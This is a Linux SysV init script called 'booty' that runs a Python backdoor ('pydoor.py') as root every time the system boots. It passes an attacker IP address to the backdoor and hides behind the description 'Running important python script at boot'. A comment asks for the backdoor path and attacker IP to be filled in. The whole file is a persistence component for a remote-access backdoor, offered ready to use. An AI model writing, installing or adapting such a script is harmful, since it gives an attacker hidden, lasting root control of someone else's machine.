#! /bin/sh
# /etc/init.d/booty

### BEGIN INIT INFO
# Provides: booty
# Required-Start: $remote_fs $syslog
# Required-Stop: $remote_fs $syslog
# Default-Start: 2 3 4 5
# Default-Stop: 0 1 6
# Short-Description: Running important python script at boot
# Description: Its important
### END INIT INFO

#TODO insert path to backdoor.py and attacker IP here ###########
DIR=/home/user							#
ATTACKER="10.0.0.1"						#
#################################################################

DAEMON=$DIR/pydoor.py
DAEMON_NAME=pydoor
DAEMON_USER=root
PIDFILE=/var/run/$DAEMON_NAME.pid

. /lib/lsb/init-functions

case "$1" in
	start)
		start-stop-daemon --start --background --pidfile $PIDFILE --make-pidfile --user $DAEMON_USER --chuid $DAEMON_USER --startas $DAEMON -- $ATTACKER
		# alternative for systems that dont support the function above
		#python $DAEMON $ATTACKER
		;;
	stop)
		start-stop-daemon --stop --pidfile $PIDFILE --retry 10
		# alternative for systems that dont support the function above
		#killall python
		;;
	*)
		echo "Usage: /etc/init.d/booty {start|stop}"
		exit 1
		;;
esac

exit 0
